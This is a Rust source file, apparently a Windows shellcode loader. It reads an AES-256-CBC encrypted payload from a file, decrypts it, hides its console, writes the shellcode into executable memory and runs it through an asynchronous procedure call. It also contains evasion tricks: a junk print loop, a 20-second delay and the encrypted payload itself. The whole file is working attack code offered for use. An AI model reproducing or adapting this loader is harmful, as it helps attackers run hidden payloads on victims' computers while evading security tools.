use clap::Parser;
use libaes::Cipher;
use std::fs::File;
use std::io::Read;
use std::thread::sleep;

use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory};
use ntapi::ntpsapi::{
    NtCurrentProcess, NtCurrentThread, NtQueueApcThread, NtTestAlert, PPS_APC_ROUTINE,
};
use ntapi::winapi::ctypes::c_void;
use std::ptr::null_mut;
use std::time::Duration;
#[derive(Parser, Debug)]
struct Args {
    #[clap(short, long, default_value = "shellcode.bin")]
    input_file: String,
}
impl Args {
    fn new() -> Self {
        Args::parse()
    }
}

fn main() {
    for _ in 0..10000 {
        print!("{}", 1 * 1);
    }

    let args = Args::new();

    let input_file = args.input_file;

    //Read into buffer
    let mut f = match File::open(&input_file) {
        Ok(f) => f,
        Err(e) => {
            println!("[!] Could not open file: {}", e);
            std::process::exit(1);
        }
    };

    let metadata = std::fs::metadata(&input_file).unwrap();
    let mut buffer: Vec<u8> = vec![0; metadata.len() as usize];
    f.read(&mut buffer).unwrap();

    let iv = buffer[0..16].try_into().unwrap();
    let key: [u8; 32] = buffer[16..48].try_into().unwrap();

    let cipher = Cipher::new_256(&key);
    sleep(Duration::from_secs(20));
    let shellcode = &buffer[48..];

    let decrypted_shellcode = cipher.cbc_decrypt(iv, &shellcode[..]);

    println!("[*] Decrypted shellcode: ");

    for (i, byte) in decrypted_shellcode.iter().enumerate() {
        if i % 16 == 0 {
            print!("{:08x}: ", i);
        }
        print!("{:02x} ", byte);
        if (i + 1) % 16 == 0 {
            println!();
        }
    }
    println!();

    unsafe {
        winapi::um::wincon::FreeConsole();
    };

    unsafe {
        let mut allocstart: *mut c_void = null_mut();
        let mut seize: usize = decrypted_shellcode.len();
        NtAllocateVirtualMemory(
            NtCurrentProcess,
            &mut allocstart,
            0,
            &mut seize,
            0x00003000,
            0x40,
        );
        NtWriteVirtualMemory(
            NtCurrentProcess,
            allocstart,
            decrypted_shellcode.as_ptr() as _,
            decrypted_shellcode.len() as usize,
            null_mut(),
        );
        NtQueueApcThread(
            NtCurrentThread,
            Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE,
            allocstart,
            null_mut(),
            null_mut(),
        );
        NtTestAlert();
    }
}
